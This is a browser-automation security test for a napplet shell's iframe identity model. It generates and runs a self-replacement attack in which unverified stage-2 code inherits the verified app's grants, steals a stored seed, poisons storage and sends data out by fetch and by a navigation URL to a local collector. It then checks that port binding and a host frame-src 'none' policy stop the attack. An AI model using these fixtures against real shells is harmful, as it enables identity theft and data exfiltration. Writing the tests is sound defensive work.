// evil-09 — frame self-replacement & identity inheritance. Pre-#14 shells map
// (dTag, artifactHash) + grants to the iframe Window, which survives same-frame
// navigation: a napplet that replaces its own document passes the verified
// identity to unverified bytes, and the injected meta CSP dies with the verified
// document. The harness `binding: port` knob is the post-#14 green gate.
import { chromium, BASE, loadHarness, statuses, makeChecks, armVeryEvil, collectExfil, evidence, shellLogIncludes } from './_helper.mjs';
import { mkdirSync, writeFileSync, rmSync } from 'node:fs';

const check = makeChecks();
const browser = await chromium.launch({ viewport: { width: 1600, height: 1200 } });
const ID = 'evil-09-self-replacement';

async function detonate(f) {
  await f.locator('.attack[data-attack="self-replace"] button[data-probe]').click();
  // stage-2 renders its own rows in the same frame (same Window, new document)
  await f.waitForFunction(() => !!document.querySelector('.attack[data-attack="url-disclosure"]'), null, { timeout: 10000 });
}

// window binding (pre-#14, default harness): the sweep proves the keying
{
  const page = await browser.newPage({ viewport: { width: 1600, height: 1200 } });
  const f = await loadHarness(page, { napplet: ID, runtime: true, settleMs: 6000 });
  const st = await statuses(f);
  check('window-keyed: NAP rides window-level postMessage (identity keyed to the Window)', st['window-keying'] === 'armed', JSON.stringify(st));
  check('window-keyed: replacement telemetry honestly na (shell-side watch)', st['replacement-watch'] === 'na');
  check('window-keyed: detonation row READY — armed by construction, never auto-run', st['self-replace'] === 'ready');
  const ev = await evidence(f, 'window-keying');
  check('window-keyed: evidence names the Window mapping', ev.includes('WINDOW-LEVEL') && ev.includes('Window'), ev.slice(0, 160));
  await page.close();
}

// DETONATE under window binding: unverified stage-2 bytes inherit everything
{
  const page = await browser.newPage({ viewport: { width: 1600, height: 1200 } });
  const f = await loadHarness(page, { napplet: ID, runtime: true, settleMs: 6000 });
  await detonate(f);
  const st = await statuses(f); // now reads stage-2's rows in the same frame
  check('detonated: stage-2 unverified bytes live in the frame (document replaced)', st['replaced-document'] === 'armed', JSON.stringify(st));
  check('detonated: raw NAP from UNVERIFIED bytes ACCEPTED — grants inherited', st['grant-inheritance'] === 'armed');
  check('detonated: injected meta CSP evaporated with the verified document', st['csp-evaporation'] === 'armed');
  check('detonated: navigation-URL carried data across the document boundary', st['url-disclosure'] === 'armed');
  const ev = await evidence(f, 'grant-inheritance');
  check('detonated: inherited the victim seed from the verified namespace', ev.includes('INHERITED-BY-EVIL-09'), ev.slice(0, 160));
  check('detonated: shell LOGGED the attacker document\'s report (it cannot tell)', await shellLogIncludes(page, 'ATTACKER DOCUMENT reported'));
  const order = await page.evaluate(() => {
    const lines = window.__evilLogLines || [];
    const s2 = lines.findIndex((l) => l.includes('ATTACKER DOCUMENT reported'));
    const accAfter = lines.findIndex((l, i) => i > s2 && l.includes('ACCEPTED {"type":"storage.get"'));
    return { s2, accAfter };
  });
  check('detonated: shell SERVED the replacement document (ACCEPTED storage.get after stage-2 booted)', order.s2 >= 0 && order.accAfter > order.s2, JSON.stringify(order));
  const alive = await page.evaluate(() => { const el = document.getElementById('frame'); return !!el && el.isConnected; });
  check('detonated: window-keyed shell left the attacker frame in place — no teardown', alive);
  await page.close();
}

// no runtime domain: transport unobservable
{
  const page = await browser.newPage({ viewport: { width: 1600, height: 1200 } });
  const f = await loadHarness(page, { napplet: ID, settleMs: 6000 });
  const st = await statuses(f);
  check('no runtime: NAP transport unobservable (na)', st['window-keying'] === 'na', JSON.stringify(st));
  await page.close();
}

// port binding (post-#14, the green gate): replies ride the port
{
  const page = await browser.newPage({ viewport: { width: 1600, height: 1200 } });
  const f = await loadHarness(page, { napplet: ID, binding: 'port', runtime: true, settleMs: 6000 });
  const st = await statuses(f);
  check('port-bound: NO window-level NAP envelope — the green gate holds', st['window-keying'] === 'blocked', JSON.stringify(st));
  check('port-bound: detonation row still READY (primitive exists; the shell must hold it)', st['self-replace'] === 'ready');
  const ev = await evidence(f, 'window-keying');
  check('port-bound: evidence names the port handoff', ev.toLowerCase().includes('port'), ev.slice(0, 160));
  check('port-bound: verified document was port-bound (HELLO accepted)', await shellLogIncludes(page, 'HELLO accepted'));
  await page.close();
}

// DETONATE under port binding: the shell revokes and tears the frame down
{
  const page = await browser.newPage({ viewport: { width: 1600, height: 1200 } });
  const f = await loadHarness(page, { napplet: ID, binding: 'port', runtime: true, settleMs: 6000 });
  await f.locator('.attack[data-attack="self-replace"] button[data-probe]').click();
  await page.waitForFunction(() => (window.__evilLogLines || []).join('\n').includes('REVOKED'), null, { timeout: 10000 });
  check('port-bound detonate: replacement REVOKED (port close / second load → identity + grants torn down)', true);
  const removed = await page.waitForFunction(() => !document.getElementById('frame'), null, { timeout: 5000 }).then(() => true).catch(() => false);
  check('port-bound detonate: attacker frame REMOVED from the shell', removed);
  const logText = await page.evaluate(() => (window.__evilLogLines || []).join('\n'));
  check('port-bound detonate: revocation names the replacement evidence', /REVOKED identity \(dTag=evil-09-self-replacement\)/.test(logText), logText.slice(-300));
  await page.close();
}

// VERY EVIL under window binding: stage-2 poisons the namespace and exfiltrates
// via the navigation URL — no CSP directive governs a location assignment
{
  const page = await browser.newPage({ viewport: { width: 1600, height: 1200 } });
  const exfil = [];
  collectExfil(page, exfil);
  const f = await loadHarness(page, { napplet: ID, runtime: true, csp: false, settleMs: 6000 });
  await armVeryEvil(f, BASE + '/collect');
  // the fixture's exfil navigation fires ~1.2s after its 'finished.' line
  const navUrl = await page.waitForRequest((r) => r.url().includes('evil09-nav-exfil'), { timeout: 10000 }).then((r) => r.url()).catch(() => null);
  const poisoned = await page.waitForFunction(() => JSON.stringify(window.__evilStore()).includes('__evil09_poison__'), null, { timeout: 10000 }).then(() => true).catch(() => false);
  check('very-evil: UNVERIFIED stage-2 bytes POISONED the verified namespace (__evil09_poison__)', poisoned);
  const navExfil = !!navUrl && navUrl.includes('victim-data-INHERITED-BY-EVIL-09');
  check('very-evil: navigation-URL exfil reached the collector with the seed', navExfil, navUrl || exfil.map((e) => e.url.slice(0, 90)).join(' || '));
  const fetchExfil = exfil.some((e) => (e.body || '').includes('victim-data-INHERITED-BY-EVIL-09'));
  check('very-evil: window-keying exfil captured (fetch channel, csp off)', fetchExfil);
  check('very-evil: both exfil channels fired (fetch + navigation URL)', exfil.length >= 2, exfil.length + ' requests');
  await page.close();
}

// Pre-load self-navigation (finding 14, napplet/evil#5 — supports NIP-5D spec
// change B). A napplet whose FIRST inline script self-navigates replaces its
// own document BEFORE the frame's first load event fires. Replacement-watch
// keyed on a second load / second napplet.hello has no baseline to compare
// against — there was never a first load of the verified document. Two controls
// hold: the port binding (window-level NAP from the replacement is replacement
// evidence whatever the timing) and the EMBEDDING page's `frame-src 'none'`
// (harness ?hostframesrc=none), which still lets the shell's srcdoc napplet
// load but blocks the frame navigating itself to data:/http(s):.
{
  const fixtureDir = 'napplets/evil-preload-selfnav';
  mkdirSync(fixtureDir, { recursive: true });
  // frame-tag-free; the data: stage-2 does a raw window-level storage.get for
  // the verified napplet's seed, then reports what it was served.
  const stage2 = [
    '(function(){',
    '  var id="pl-"+Math.random().toString(16).slice(2);',
    '  var on=function(e){var d=e.data;if(d&&d.id===id){window.removeEventListener("message",on);',
    '    parent.postMessage({type:"evil.stage2.report",report:{via:"preload-selfnav",served:(d.value!=null?String(d.value):null)}},"*");}};',
    '  window.addEventListener("message",on);',
    '  parent.postMessage({type:"storage.get",id:id,key:"__evil09_victim__"},"*");',
    '  setTimeout(function(){parent.postMessage({type:"evil.stage2.report",report:{via:"preload-selfnav",served:null}},"*");},1500);',
    '})();',
  ].join('');
  const fixtureFor = (id, targetExpr) =>
    '<!doctype html><html><head><meta name="napplet-id" content="' + id + '"></head><body>\n' +
    '<script>\n' +
    'window.__EVIL_ID__="' + id + '";\n' +
    'var gt="<",so=gt+"scr"+"ipt>",sc=gt+"/scr"+"ipt>";\n' +
    'var inner="<!doctype html>"+so+' + JSON.stringify(stage2) + '+sc;\n' +
    'location.replace(' + targetExpr + ');\n' +
    '</scr' + 'ipt>\n</body></html>\n';
  writeFileSync(fixtureDir + '/index.html', fixtureFor('evil-preload-selfnav', '"data:text/html,"+encodeURIComponent(inner)'));
  // http(s) variant: the realistic attacker-page target (same-host stand-in)
  const httpDir = 'napplets/evil-preload-selfnav-http';
  mkdirSync(httpDir, { recursive: true });
  writeFileSync(httpDir + '/index.html', fixtureFor('evil-preload-selfnav-http', '"' + BASE + '/harness/preload-landed"'));
  async function runPreload(id, opts) {
    const page = await browser.newPage({ viewport: { width: 1200, height: 900 } });
    await page.goto(BASE + '/harness/' + (opts.hostFrameSrc ? '?hostframesrc=none' : ''));
    await page.check('input[name="runtime"]');
    if (opts.binding === 'port') await page.check('input[name="binding"][value="port"]');
    await page.evaluate((v) => { const s = document.getElementById('nappletSel'); const o = document.createElement('option'); o.value = v; s.appendChild(o); }, id);
    await page.selectOption('#nappletSel', id);
    const landed = [];
    page.on('request', (r) => { if (r.url().includes('/harness/preload-landed')) landed.push(r.url()); });
    await page.click('#loadBtn');
    await page.waitForTimeout(2500);
    const log = await page.evaluate(() => (window.__evilLogLines || []).join('\n'));
    await page.close();
    return { log, landed };
  }
  try {
    // window binding: the replacement is served — no first-load baseline
    {
      const page = await browser.newPage({ viewport: { width: 1200, height: 900 } });
      await page.goto(BASE + '/harness/');
      await page.check('input[name="runtime"]');
      await page.evaluate(() => { const s = document.getElementById('nappletSel'); const o = document.createElement('option'); o.value = 'evil-preload-selfnav'; s.appendChild(o); });
      await page.selectOption('#nappletSel', 'evil-preload-selfnav');
      await page.click('#loadBtn');
      await page.waitForTimeout(2500);
      const log = await page.evaluate(() => (window.__evilLogLines || []).join('\n'));
      check('preload window-keyed: pre-first-load replacement ACCEPTED — replacement-watch is blind (finding 14)', /ACCEPTED \{"type":"storage.get"/.test(log), log.slice(-240));
      check('preload window-keyed: the replacement was SERVED the verified seed', /ATTACKER DOCUMENT reported.*INHERITED-BY-EVIL-09/.test(log), (log.match(/ATTACKER DOCUMENT reported.*/) || [''])[0].slice(0, 160));
      const alive = await page.evaluate(() => { const el = document.getElementById('frame'); return !!el && el.isConnected; });
      check('preload window-keyed: no teardown — the shell never saw a first load to diff against', alive);
      await page.close();
    }
    // port binding (the green gate): window-level NAP is replacement evidence,
    // whatever the timing — the replacement is dropped and the frame torn down.
    {
      const page = await browser.newPage({ viewport: { width: 1200, height: 900 } });
      await page.goto(BASE + '/harness/');
      await page.check('input[name="runtime"]');
      await page.check('input[name="binding"][value="port"]');
      await page.evaluate(() => { const s = document.getElementById('nappletSel'); const o = document.createElement('option'); o.value = 'evil-preload-selfnav'; s.appendChild(o); });
      await page.selectOption('#nappletSel', 'evil-preload-selfnav');
      await page.click('#loadBtn');
      await page.waitForTimeout(2500);
      const log = await page.evaluate(() => (window.__evilLogLines || []).join('\n'));
      check('preload port-bound: replacement REVOKED despite the pre-load timing (green gate holds)', /REVOKED identity/.test(log), log.slice(-260));
      check('preload port-bound: the replacement was NOT served the seed', !/INHERITED-BY-EVIL-09/.test(log), log.slice(-200));
      await page.close();
    }
    // embedding-page frame-src 'none' (the host-CSP green gate): the srcdoc
    // napplet still loads, but its pre-load self-navigation is blocked.
    {
      const r = await runPreload('evil-preload-selfnav', { binding: 'window', hostFrameSrc: true });
      check('preload host frame-src none: data: self-navigation BLOCKED by the embedding page CSP', /HOST CSP BLOCKED frame-src/.test(r.log), r.log.slice(-260));
      check('preload host frame-src none: no replacement served, even under window binding', !/ACCEPTED \{"type":"storage.get"/.test(r.log) && !/INHERITED-BY-EVIL-09/.test(r.log), r.log.slice(-200));
      const h = await runPreload('evil-preload-selfnav-http', { binding: 'window', hostFrameSrc: true });
      check('preload host frame-src none: http(s) self-navigation BLOCKED — no request leaves for the target', /HOST CSP BLOCKED frame-src/.test(h.log) && h.landed.length === 0, h.landed.join(',') + ' :: ' + h.log.slice(-160));
      const c = await runPreload('evil-preload-selfnav-http', { binding: 'window', hostFrameSrc: false });
      check('preload control (no host CSP): the http(s) self-navigation DOES reach the target', c.landed.length > 0, c.log.slice(-160));
    }
    // the shell's own srcdoc napplet still loads under host frame-src 'none'
    {
      const page = await browser.newPage({ viewport: { width: 1600, height: 1200 } });
      const f = await loadHarness(page, { napplet: ID, runtime: true, hostFrameSrc: 'none', settleMs: 6000 });
      const st = await statuses(f);
      check('host frame-src none: the verified srcdoc napplet still loads and runs its probes', st['window-keying'] === 'armed', JSON.stringify(st));
      await page.close();
    }
  } finally {
    rmSync(fixtureDir, { recursive: true, force: true });
    rmSync('napplets/evil-preload-selfnav-http', { recursive: true, force: true });
  }
}

await browser.close();
check.finish();
